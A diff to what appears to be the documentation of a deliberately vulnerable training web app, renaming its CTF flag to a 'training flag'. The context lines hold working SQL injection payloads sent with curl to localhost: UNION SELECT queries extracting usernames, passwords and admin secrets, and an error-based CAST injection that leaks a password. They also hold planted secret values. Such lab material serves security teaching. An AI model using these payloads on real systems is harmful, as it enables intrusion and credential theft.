@@ -212,7 +212,7 @@ CREATE TABLE admin_secrets (
 
 | id | key            | value                              |
 |----|----------------|------------------------------------|
-| 1  | FLAG           | `CTF{sql_injection_master_2025}`   |
+| 1  | FLAG           | `DevNull{sql_injection_master_2025}` |
 | 2  | DB_BACKUP_KEY  | `xK9#mP2$vL5nQ8wR`                |
 | 3  | JWT_SECRET     | `super-secret-jwt-key-do-not-share`|
 
@@ -405,7 +405,7 @@ const query = `SELECT id, book_title, author, progress_percentage, user_id
 # Extract all usernames and passwords
 curl "http://localhost:3000/api/search?q=' UNION SELECT id,username,password,email,role FROM users--"
 
-# Extract admin secrets (CTF flag)
+# Extract admin secrets (training flag)
 curl "http://localhost:3000/api/search?q=' UNION SELECT id,key,value,'x','y' FROM admin_secrets--"
 
 # Extract database schema
@@ -742,7 +742,7 @@ curl "http://localhost:3000/api/my-book?title=' AND 1=CAST((SELECT password FROM
 # "error": "SQLITE_ERROR: no such column: admin123"
 # (The password value appears in the error!)
 
-# Extract the CTF flag
+# Extract the training flag
 curl "http://localhost:3000/api/my-book?title=' AND 1=CAST((SELECT value FROM admin_secrets WHERE key='FLAG') AS INTEGER)--" \
   -b "user_id=1; username=admin"
 ```
